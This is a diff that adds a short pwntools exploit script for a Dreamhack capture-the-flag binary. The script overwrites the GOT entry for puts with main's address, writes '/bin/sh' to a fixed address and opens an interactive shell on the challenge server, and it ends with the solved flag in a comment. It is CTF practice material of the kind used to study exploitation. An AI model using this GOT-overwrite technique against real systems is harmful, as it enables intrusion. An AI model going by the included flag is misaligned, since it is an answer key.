@@ -1,0 +1,24 @@
+from pwn import *
+
+e = ELF("./prob")
+
+script = '''
+set follow-fork-mode parent
+b *main
+'''
+
+p = remote("host1.dreamhack.games", 23094)
+#p = process("./prob")
+#p = gdb.debug("./prob", gdbscript = script)
+
+puts_got = e.got['puts']
+main = e.symbols['main']
+p.sendlineafter(b"pt: ", f"{puts_got}".encode())
+p.sendlineafter(b"input: ", p64(main))
+
+st = 0x404080
+p.sendlineafter(b"pt: ", f"{st}".encode())
+p.sendlineafter(b"input: ", b"/bin/sh\x00")
+
+p.interactive()
+#DH{d0w3ll_w17h_4ddr:guAkcnSP4OMai+w/kc10MA==}
